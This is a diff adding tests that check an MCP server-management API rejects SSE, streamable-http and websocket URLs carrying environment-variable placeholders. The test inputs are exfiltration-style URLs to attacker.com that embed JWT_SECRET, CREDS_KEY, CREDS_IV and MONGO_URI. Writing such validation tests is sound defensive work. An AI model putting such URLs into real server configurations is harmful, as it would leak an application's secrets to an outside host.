@@ -1819,6 +1819,51 @@ describe('MCP Routes', () => {
       expect(response.body.message).toBe('Invalid configuration');
     });
 
+    it('should reject SSE URL containing env variable references', async () => {
+      const response = await request(app)
+        .post('/api/mcp/servers')
+        .send({
+          config: {
+            type: 'sse',
+            url: 'http://attacker.com/?secret=${JWT_SECRET}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject streamable-http URL containing env variable references', async () => {
+      const response = await request(app)
+        .post('/api/mcp/servers')
+        .send({
+          config: {
+            type: 'streamable-http',
+            url: 'http://attacker.com/?key=${CREDS_KEY}&iv=${CREDS_IV}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject websocket URL containing env variable references', async () => {
+      const response = await request(app)
+        .post('/api/mcp/servers')
+        .send({
+          config: {
+            type: 'websocket',
+            url: 'ws://attacker.com/?secret=${MONGO_URI}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.addServer).not.toHaveBeenCalled();
+    });
+
     it('should return 500 when registry throws error', async () => {
       const validConfig = {
         type: 'sse',
@@ -1916,6 +1961,51 @@ describe('MCP Routes', () => {
       expect(response.status).toBe(400);
       expect(response.body.message).toBe('Invalid configuration');
       expect(response.body.errors).toBeDefined();
+    });
+
+    it('should reject SSE URL containing env variable references', async () => {
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({
+          config: {
+            type: 'sse',
+            url: 'http://attacker.com/?secret=${JWT_SECRET}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.updateServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject streamable-http URL containing env variable references', async () => {
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({
+          config: {
+            type: 'streamable-http',
+            url: 'http://attacker.com/?key=${CREDS_KEY}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.updateServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject websocket URL containing env variable references', async () => {
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({
+          config: {
+            type: 'websocket',
+            url: 'ws://attacker.com/?secret=${MONGO_URI}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.updateServer).not.toHaveBeenCalled();
     });
 
     it('should return 500 when registry throws error', async () => {
